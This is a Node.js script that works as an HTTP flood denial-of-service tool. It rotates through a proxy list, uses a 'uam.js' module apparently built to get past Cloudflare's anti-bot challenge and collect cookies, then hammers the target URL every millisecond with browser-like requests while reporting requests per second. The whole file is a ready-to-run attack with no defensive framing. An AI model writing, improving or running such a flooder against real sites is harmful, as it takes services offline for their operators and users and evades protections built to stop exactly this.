const request = require('request')
,uam = require('./uam.js')
,fs = require('fs')
,ProxyAgent = require('proxy-agent'),
URL = require('url'),
{
  PerformanceObserver,
  performance
} = require('perf_hooks');
let startTime = performance.now();
global.durl = URL.parse(process.argv[2]);
let time = parseFloat(process.argv[3]) * 1e3;
global.proxier = (obj, proxy) => {
  let proxy_type = proxy.split('://')[0];
  switch (proxy_type) {
    case 'http':
      obj.proxy = proxy;
      break;
    default:
      obj.agent = new ProxyAgent(proxy);
      break
  }
  return obj;
}
const proxies = fs.readFileSync('proxies.txt', 'utf-8').replace(/\r/g, '').split('\n');
let POOL = []
let dproxy = 0;
setInterval(() => {
	dproxy++;
  if (dproxy >= proxies.length) {
	  return false;
  }
  var proxy = proxies[dproxy];

  uam(durl.href, proxy, (cookie, userAgent) => {
    if (!cookie) return;
    POOL.push([proxy, userAgent, cookie])
  });
}, 100);
process.setMaxListeners(Infinity);
process.on('uncaughtException', exception => {
  return;
  //console.warn(exception);
})

function makeid(length) {
   var result           = '';
   var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
   var charactersLength = characters.length;
   for ( var i = 0; i < length; i++ ) {
      result += characters.charAt(Math.floor(Math.random() * charactersLength));
   }
   return result;
}

let rqps = 0,
stats = {
}

setInterval(() => {
  POOL.forEach(vool => {
    //console.log(vool);
    request.get(proxier({
      url: durl.href,
      headers: {
        'authority': durl.host.replace(/%RAND%/g, makeid(5)),
        'cache-control': 'max-age=0',
        'dnt': '1',
        'upgrade-insecure-requests': '1',
        'user-agent': vool[1],
        'sec-fetch-dest': 'document',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'sec-fetch-site': 'none',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-user': '?1',
        'accept-language': 'en-US,en;q=0.9',
        'cookie': vool[2]
      }
    }, vool[0]), (err, res, body) => {
      if (err) return;
      if (res) {
        if (!stats[res.statusCode]) stats[res.statusCode] = 0;
        stats[res.statusCode]++;
      }
      rqps++;
      setTimeout(() => {rqps--}, 1e3);
    });
  })
}, 1)

setInterval(() => {
  console.log(`[${(time - performance.now()) / 1e3}s left] Requests per second: ${rqps}`, stats)
}, 1e3)

setTimeout(() => {
  console.log('Script is finished ::', new Date().toUTCString())
  process.exit();
}, time)